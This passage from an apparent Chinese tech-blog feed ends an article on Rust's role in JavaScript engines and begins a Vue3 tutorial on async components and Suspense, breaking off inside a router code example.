Rust实现，基于PEG生成器，解析比传统快10-15%，代码覆盖率&gt;95%</td><td>Firefox解析器组件，开发工具，IDE代码分析</td><td>4.3</td></tr><tr><td>Rustyscript</td><td>执行环境</td><td>轻量级JS执行环境，简化API</td><td>简单脚本执行需求</td><td>3.0</td></tr></tbody></table>
<h3 data-id="heading-24">5.3 内存占用与启动性能对比</h3>



































<table><thead><tr><th>引擎类型</th><th>典型内存占用</th><th>启动时间</th><th>适用环境</th></tr></thead><tbody><tr><td>Rust 轻量引擎</td><td>&lt; 10MB</td><td>毫秒级</td><td>嵌入式设备、微控制器</td></tr><tr><td>Rust 完整引擎</td><td>10-50MB</td><td>亚秒级</td><td>桌面应用、服务端</td></tr><tr><td>C++ 主流引擎</td><td>50-200MB</td><td>秒级</td><td>浏览器、Node.js</td></tr><tr><td>C 轻量引擎</td><td>&lt; 5MB</td><td>微秒级</td><td>极资源受限环境</td></tr></tbody></table>
<h2 data-id="heading-25">六、JS 引擎发展趋势与 Rust 的未来角色</h2>
<h3 data-id="heading-26">6.1 安全性优先的设计理念</h3>
<p>随着网络安全威胁的日益复杂，JavaScript 引擎的安全性将成为首要考量。根据行业趋势，我们可以预见：</p>
<ul>
<li><strong>内存安全漏洞减少</strong>：如华为的实践所示，将核心组件 Rust 化可减少高达 67% 的内存安全漏洞 1，这一数据将推动更多引擎开发者采用 Rust</li>
<li><strong>形式化验证增加</strong>：Rust 的类型系统为形式化验证提供了基础，未来可能会看到更多经过形式化验证的 JS 引擎组件</li>
<li><strong>零信任架构融合</strong>：JavaScript 引擎将更深入地融入零信任安全架构，Rust 的不可变性和所有权特性使其成为实现这一目标的理想语言</li>
</ul>
<h3 data-id="heading-27">6.2 多样化部署环境的适应</h3>
<p>JavaScript 引擎正从浏览器和服务器扩展到更广泛的领域：</p>
<ul>
<li><strong>嵌入式与物联网</strong>：Rust 实现的轻量级 JS 引擎将成为 IoT 设备的理想选择，支持在资源受限环境中运行 JS 代码</li>
<li><strong>边缘计算节点</strong>：在 5G/6G 网络推动下，边缘节点需要高效执行 JS 代码，Rust 引擎可提供低延迟、高吞吐量的解决方案</li>
<li><strong>智能汽车与工业系统</strong>：这些对安全性和实时性要求极高的领域，将从 Rust 实现的 JS 引擎中获益良多</li>
</ul>
<h3 data-id="heading-28">6.3 WebAssembly 与 JavaScript 的深度融合</h3>
<p>WebAssembly 的普及正在改变 JavaScript 引擎的架构设计：</p>
<ul>
<li><strong>统一执行模型</strong>：未来 JS 引擎可能采用更统一的执行模型，无缝切换 JavaScript 和 WebAssembly 代码</li>
<li><strong>混合优化策略</strong>：Rust 作为 WebAssembly 的主要开发语言，将在优化混合执行环境方面发挥关键作用</li>
<li><strong>共享内存与协作</strong>：JavaScript 和 WebAssembly 模块之间的内存共享和协作将更加高效，Rust 的安全并发特性将促进这一发展</li>
</ul>
<h3 data-id="heading-29">6.4 云原生与服务器端应用</h3>
<p>JavaScript 在服务器端的应用正在扩展，Rust 实现的引擎将在以下方面提供价值：</p>
<ul>
<li><strong>微服务架构</strong>：轻量级 Rust JS 引擎适合构建高效的微服务，减少资源占用</li>
<li><strong>无服务器计算</strong>：更快的启动时间和更低的内存占用，使 Rust JS 引擎成为 FaaS 场景的理想选择</li>
<li><strong>实时数据处理</strong>：利用 Rust 的性能优势，处理高吞吐量的实时数据流</li>
</ul>
<h3 data-id="heading-30">6.5 生态系统整合与标准演进</h3>
<p>Rust 与 JavaScript 生态系统的整合将加深：</p>
<ul>
<li><strong>工具链共享</strong>：更多构建工具、调试器和性能分析工具将同时支持 Rust 和 JavaScript</li>
<li><strong>标准库互操作</strong>：JavaScript 标准库可能会借鉴 Rust 的某些设计理念，如更严格的类型检查</li>
<li><strong>跨语言框架</strong>：更多框架将支持 Rust 和 JavaScript 的无缝协作，如 Tauri 等桌面应用框架</li>
</ul>
<h3 data-id="heading-31">6.6 量化的未来展望：2025-2030</h3>
<p>基于当前技术发展趋势，我们可以对 Rust 在 JS 引擎领域的未来做出以下预测：</p>
<ul>
<li><strong>2025 年</strong>：至少有一个主流浏览器引擎将有 20% 以上的组件使用 Rust 实现</li>
<li><strong>2026 年</strong>：首个完全使用 Rust 实现的生产级 JS 引擎将问世</li>
<li><strong>2028 年</strong>：Rust 实现的 JS 引擎在嵌入式和边缘计算领域的市场份额将超过 30%</li>
<li><strong>2030 年</strong>：JavaScript 引擎的安全漏洞将比 2023 年减少 50%，主要归功于 Rust 等内存安全语言的采用</li>
</ul>
<h2 data-id="heading-32">七、结论</h2>
<p>Rust 在 JavaScript 引擎赛道中正在扮演越来越重要的角色。从纯 Rust 实现的 Boa 引擎，到 Mozilla 的 Jsparagus 解析器，再到与现有 C++ 引擎的集成方案，Rust 正在为 JavaScript 引擎带来新的技术可能性。</p>
<p>随着 Rust 生态系统的不断成熟和性能优化工作的持续推进，我们有理由相信，未来将会看到更多性能卓越、安全可靠的 JavaScript 引擎采用 Rust 实现或部分组件 Rust 化。对于开发者而言，了解 Rust 在 JavaScript 引擎中的应用，不仅有助于选择合适的技术栈，也能更好地理解现代 Web 技术的发展方向。</p>
<p>在这个性能与安全并重的时代，Rust 正在为 JavaScript 引擎的发展开辟一条新的道路，而这条道路，值得我们持续关注和探索。</p>
<hr/>
 <p/>
<table>
    <tbody><tr>
        <td>
            <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f67cd30497a34f66ae5547c02192f59b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1300&amp;h=1820&amp;s=574996&amp;e=jpg&amp;b=81dd6b" width="150" loading="lazy"/>
        </td>
        <td> 
<p>更多 JavaScript 基础知识的学习，可以学习我写的这本 <a href="https://juejin.cn/book/7226969813581889575" target="_blank" title="https://juejin.cn/book/7226969813581889575">《JavaScript 语言编程进阶》</a>  小册。 </p></td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南]]></title>    <link>https://juejin.cn/post/7575320672572194858</link>    <guid>https://juejin.cn/post/7575320672572194858</guid>    <pubDate>2025-11-23T03:12:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575320672572194858" data-draft-id="7575159361904377897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-23T03:12:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北辰alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北辰alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:12:37.000Z" title="Sun Nov 23 2025 03:12:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南</strong></h2>
<h3 data-id="heading-1"><strong>摘要</strong></h3>
<p>在大型 Vue.js 应用中，组件异步加载是优化性能、提升用户体验的关键技术。Vue3 提供了全新且更强大的异步组件机制，支持 <code>defineAsyncComponent</code>、组合式 API 与 Suspense 配合等现代化方案。本文将深入探讨 Vue3 中异步组件的各种实现方式，通过详细的代码示例、执行流程分析和最佳实践，帮助你彻底掌握这一重要特性。</p>
<hr/>
<h3 data-id="heading-2"><strong>一、 为什么需要异步组件？</strong></h3>
<h4 data-id="heading-3"><strong>1.1 性能瓶颈与解决方案</strong></h4>
<p>在传统单页面应用（SPA）中，所有组件通常被打包到一个 JavaScript 文件中，导致：</p>
<ul>
<li><strong>首屏加载缓慢</strong>：用户需要等待整个应用下载完成才能看到内容</li>
<li><strong>资源浪费</strong>：用户可能永远不会访问某些页面，但依然加载了对应的代码</li>
<li><strong>用户体验差</strong>：特别是对于移动端用户和网络条件较差的场景</li>
</ul>
<p><strong>异步组件</strong>通过代码分割（Code Splitting）解决了这些问题：</p>
<ul>
<li><strong>按需加载</strong>：只在需要时加载组件代码</li>
<li><strong>减小初始包体积</strong>：显著降低首屏加载时间</li>
<li><strong>优化缓存</strong>：独立 chunk 可以更好地利用浏览器缓存</li>
</ul>
<h4 data-id="heading-4"><strong>1.2 Vue3 异步组件的新特性</strong></h4>
<p>Vue3 在异步组件方面进行了重要改进：</p>
<ul>
<li><strong>更简洁的 API</strong>：<code>defineAsyncComponent</code> 替代 Vue2 的复杂配置</li>
<li><strong>更好的 TypeScript 支持</strong>：完整的类型推断</li>
<li><strong>与 Suspense 集成</strong>：更优雅的加载状态处理</li>
<li><strong>组合式 API 配合</strong>：更灵活的异步逻辑组织</li>
</ul>
<hr/>
<h3 data-id="heading-5"><strong>二、 基础异步组件加载</strong></h3>
<h4 data-id="heading-6"><strong>2.1 使用 <code>defineAsyncComponent</code></strong></h4>
<p>Vue3 引入了 <code>defineAsyncComponent</code> 函数来创建异步组件，这是最基础的用法。</p>
<p><strong>流程图：基础异步组件加载流程</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[父组件渲染] --&gt; B{遇到异步组件}
    B --&gt; C[显示Loading占位]
    C --&gt; D[开始加载组件]
    D --&gt; E{加载成功?}
    E -- 是 --&gt; F[渲染异步组件]
    E -- 否 --&gt; G[显示Error组件]
    F --&gt; H[组件完全激活]
</code></pre>
<p><strong>代码示例：基础用法</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;异步组件基础示例&lt;/h2&gt;
    &lt;button @click="showAsyncComponent = true"&gt;加载异步组件&lt;/button&gt;
    
    &lt;div v-if="showAsyncComponent"&gt;
      &lt;!-- 异步组件在这里渲染 --&gt;
      &lt;AsyncUserProfile /&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref } from 'vue'

// 基础异步组件定义
const AsyncUserProfile = defineAsyncComponent(() =&gt;
  import('./components/UserProfile.vue')
)

const showAsyncComponent = ref(false)
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-7"><strong>2.2 模拟异步组件内容</strong></h4>
<p><strong>UserProfile.vue</strong>（被异步加载的组件）：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-profile" style="border: 2px solid #42b983; padding: 20px; margin: 10px 0;"&gt;
    &lt;h3&gt;用户信息组件 (异步加载)&lt;/h3&gt;
    &lt;div&gt;姓名: 张三&lt;/div&gt;
    &lt;div&gt;邮箱: zhangsan@example.com&lt;/div&gt;
    &lt;div&gt;角色: 管理员&lt;/div&gt;
    &lt;div&gt;组件加载时间: {{ new Date().toLocaleTimeString() }}&lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { onMounted, onUnmounted } from 'vue'

console.log('UserProfile 组件被加载了')

onMounted(() =&gt; {
  console.log('UserProfile 组件挂载完成')
})

onUnmounted(() =&gt; {
  console.log('UserProfile 组件已卸载')
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-8"><strong>三、 高级配置：加载与错误处理</strong></h3>
<p>在实际应用中，我们需要处理加载状态和错误情况，提供更好的用户体验。</p>
<h4 data-id="heading-9"><strong>3.1 完整的配置选项</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;高级异步组件示例&lt;/h2&gt;
    
    &lt;!-- 加载状态控制按钮 --&gt;
    &lt;div style="margin-bottom: 20px;"&gt;
      &lt;button @click="loadComponent"&gt;加载高级组件&lt;/button&gt;
      &lt;button @click="unloadComponent" style="margin-left: 10px;"&gt;卸载组件&lt;/button&gt;
    &lt;/div&gt;
    
    &lt;!-- 异步组件渲染区域 --&gt;
    &lt;AdvancedAsyncComponent 
      v-if="showAdvancedComponent" 
      :user-id="currentUserId" 
    /&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref } from 'vue'

// 模拟网络延迟
const delay = (ms) =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms))

// 加载状态
const isLoading = ref(false)
const loadError = ref(null)

// 完整配置的异步组件
const AdvancedAsyncComponent = defineAsyncComponent({
  // 加载器函数
  loader: async () =&gt; {
    console.log('开始加载高级组件...')
    isLoading.value = true
    loadError.value = null
    
    try {
      // 模拟网络延迟
      await delay(2000)
      
      // 动态导入组件
      const component = await import('./components/AdvancedFeatures.vue')
      console.log('高级组件加载成功')
      return component
    } catch (error) {
      console.error('组件加载失败:', error)
      loadError.value = error
      throw error
    } finally {
      isLoading.value = false
    }
  },
  
  // 加载中显示的组件
  loadingComponent: {
    template: `
      &lt;div class="loading-container" style="padding: 40px; text-align: center; border: 2px dashed #ccc;"&gt;
        &lt;div class="spinner" style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #42b983; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"&gt;&lt;/div&gt;
        &lt;p style="margin-top: 16px; color: #666;"&gt;组件加载中，请稍候...&lt;/p&gt;
        &lt;p style="font-size: 12px; color: #999;"&gt;这通常需要 2-3 秒&lt;/p&gt;
      &lt;/div&gt;
    `
  },
  
  // 加载失败显示的组件
  errorComponent: {
    props: ['error'],
    template: `
      &lt;div class="error-container" style="padding: 40px; text-align: center; border: 2px solid #f56c6c; background: #fef0f0;"&gt;
        &lt;div style="font-size: 48px; color: #f56c6c;"&gt;❌&lt;/div&gt;
        &lt;h3 style="color: #f56c6c;"&gt;组件加载失败&lt;/h3&gt;
        &lt;p style="color: #666;"&gt;抱歉，无法加载请求的组件&lt;/p&gt;
        &lt;p style="font-size: 12px; color: #999; margin-top: 10px;"&gt;错误信息: {{ error.message }}&lt;/p&gt;
        &lt;button @click="$emit('retry')" style="margin-top: 16px; padding: 8px 16px; background: #42b983; color: white; border: none; border-radius: 4px;"&gt;重试加载&lt;/button&gt;
      &lt;/div&gt;
    `,
    emits: ['retry']
  },
  
  // 延迟显示加载状态（避免闪烁）
  delay: 200,
  
  // 超时时间（毫秒）
  timeout: 5000,
  
  // 是否可挂起（Suspense 相关）
  suspensible: false
})

// 组件状态控制
const showAdvancedComponent = ref(false)
const currentUserId = ref('12345')

const loadComponent = () =&gt; {
  showAdvancedComponent.value = true
}

const unloadComponent = () =&gt; {
  showAdvancedComponent.value = false
}
&lt;/script&gt;

&lt;style&gt;
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-10"><strong>3.2 高级功能组件示例</strong></h4>
<p><strong>AdvancedFeatures.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="advanced-features" style="border: 2px solid #e6a23c; padding: 20px; margin: 10px 0; background: #fdf6ec;"&gt;
    &lt;h3&gt;高级功能组件 (异步加载)&lt;/h3&gt;
    &lt;p&gt;组件ID: {{ props.userId }}&lt;/p&gt;
    
    &lt;div class="features"&gt;
      &lt;div v-for="feature in features" :key="feature.id" class="feature-item"&gt;
        &lt;strong&gt;{{ feature.name }}&lt;/strong&gt;: {{ feature.description }}
      &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;div style="margin-top: 20px;"&gt;
      &lt;button @click="simulateAction" style="padding: 8px 16px; background: #e6a23c; color: white; border: none; border-radius: 4px;"&gt;模拟操作&lt;/button&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, onMounted } from 'vue'

const props = defineProps({
  userId: {
    type: String,
    required: true
  }
})

const features = ref([
  { id: 1, name: '数据分析', description: '实时数据可视化分析' },
  { id: 2, name: '报表生成', description: '自动生成详细业务报表' },
  { id: 3, name: '权限管理', description: '细粒度的权限控制系统' }
])

const simulateAction = () =&gt; {
  console.log('执行高级操作，用户ID:', props.userId)
}

onMounted(() =&gt; {
  console.log('高级功能组件已挂载，用户ID:', props.userId)
})
&lt;/script&gt;

&lt;style scoped&gt;
.feature-item {
  padding: 8px;
  margin: 4px 0;
  background: white;
  border-radius: 4px;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h3 data-id="heading-11"><strong>四、 结合 Suspense 的现代方案</strong></h3>
<p>Vue3 的 <code>&lt;Suspense&gt;</code> 组件提供了更声明式的异步处理方式。</p>
<h4 data-id="heading-12"><strong>4.1 Suspense 基础用法</strong></h4>
<p><strong>流程图：Suspense 异步加载流程</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Suspense组件] --&gt; B[渲染default插槽]
    B --&gt; C{异步依赖&lt;br&gt;是否解析?}
    C -- 否 --&gt; D[显示fallback内容]
    C -- 是 --&gt; E[显示异步内容]
    D --&gt; F[异步依赖解析完成]
    F --&gt; E
    E --&gt; G[可触发resolved事件]
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;Suspense 异步组件示例&lt;/h2&gt;
    
    &lt;Suspense&gt;
      &lt;!-- 主要内容 --&gt;
      &lt;template #default&gt;
        &lt;SuspenseUserDashboard :user-id="userId" /&gt;
      &lt;/template&gt;
      
      &lt;!-- 加载状态 --&gt;
      &lt;template #fallback&gt;
        &lt;div class="suspense-loading" style="padding: 60px; text-align: center;"&gt;
          &lt;div class="loading-indicator" style="display: inline-block;"&gt;
            &lt;div style="display: flex; align-items: center; gap: 12px;"&gt;
              &lt;div class="spinner" style="width: 32px; height: 32px; border: 3px solid #e0e0e0; border-top: 3px solid #42b983; border-radius: 50%; animation: spin 1s linear infinite;"&gt;&lt;/div&gt;
              &lt;div&gt;
                &lt;p style="margin: 0; font-weight: bold;"&gt;仪表板加载中&lt;/p&gt;
                &lt;p style="margin: 4px 0 0 0; font-size: 12px; color: #666;"&gt;正在准备您的数据...&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/Suspense&gt;
    
    &lt;button @click="reloadDashboard" style="margin-top: 20px;"&gt;重新加载&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

// 异步组件（注意：需要设置 suspensible: true）
const SuspenseUserDashboard = defineAsyncComponent(() =&gt;
  import('./components/UserDashboard.vue')
)

const userId = ref('user-001')

const reloadDashboard = () =&gt; {
  // 通过改变 key 强制重新加载组件
  userId.value = 'user-' + Date.now()
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-13"><strong>4.2 支持异步设置的组件</strong></h4>
<p><strong>UserDashboard.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-dashboard" style="border: 2px solid #409eff; padding: 20px; margin: 10px 0; background: #ecf5ff;"&gt;
    &lt;h3&gt;用户仪表板 (Suspense 加载)&lt;/h3&gt;
    
    &lt;!-- 用户信息 --&gt;
    &lt;div class="user-info" style="margin-bottom: 20px;"&gt;
      &lt;h4&gt;用户信息&lt;/h4&gt;
      &lt;div v-if="userData"&gt;姓名: {{ userData.name }}&lt;/div&gt;
      &lt;div v-if="userData"&gt;等级: {{ userData.level }}&lt;/div&gt;
    &lt;/div&gt;
    
    &lt;!-- 统计卡片 --&gt;
    &lt;div class="stats" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 20px;"&gt;
      &lt;div v-for="stat in stats" :key="stat.name" class="stat-card" style="padding: 16px; background: white; border-radius: 8px; text-align: center;"&gt;
        &lt;div style="font-size: 24px; font-weight: bold; color: #409eff;"&gt;{{ stat.value }}&lt;/div&gt;
        &lt;div style="font-size: 12px; color: #666;"&gt;{{ stat.name }}&lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;!-- 最近活动 --&gt;
    &lt;div class="recent-activity"&gt;
      &lt;h4&gt;最近活动&lt;/h4&gt;
      &lt;ul&gt;
        &lt;li v-for="activity in activities" :key="activity.id" style="margin: 8px 0;"&gt;
          {{ activity.action }} - {{ activity.time }}
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, onMounted } from 'vue'

const props = defineProps({
  userId: {
    type: String,
    required: true
  }
})

// 模拟异步数据获取
const userData = ref(null)
const stats = ref([])
const activities = ref([])

// 模拟 API 调用
const fetchUserData = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve({
        name: '李四',
        level: 'VIP',
        joinDate: '2023-01-15'
      })
    }, 1500)
  })
}

const fetchStats = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve([
        { name: '项目数量', value: 24 },
        { name: '完成任务', value: 89 },
        { name: '团队排名', value: '前 5%' }
      ])
    }, 1000)
  })
}

const fetchActivities = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve([
        { id: 1, action: '创建了新项目', time: '2小时前' },
        { id: 2, action: '完成了任务', time: '5小时前' },
        { id: 3, action: '加入了团队', time: '1天前' }
      ])
    }, 800)
  })
}

// 使用 async setup（Suspense 会自动等待）
const setupData = async () =&gt; {
  console.log('开始加载仪表板数据...')
  
  // 并行加载所有数据
  const [user, statistics, recentActivities] = await Promise.all([
    fetchUserData(),
    fetchStats(),
    fetchActivities()
  ])
  
  userData.value = user
  stats.value = statistics
  activities.value = recentActivities
  
  console.log('仪表板数据加载完成')
}

// 执行异步设置
await setupData()

onMounted(() =&gt; {
  console.log('UserDashboard 组件已挂载，用户ID:', props.userId)
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-14"><strong>五、 路由级别的异步加载</strong></h3>
<p>在实际项目中，我们经常需要在路由级别进行代码分割。</p>
<h4 data-id="heading-15"><strong>5.1 Vue Router 4 中的异步路由</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.js</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/Home.vue'</span>

<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>,
    <span class="hljs-comment">// 路由级别代码分割</span>
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/About.vue'</span>)
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,
    <span class="hljs-comment">// 带有加载状态的异步路由</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title function_">defineAsyncComponent</span>({
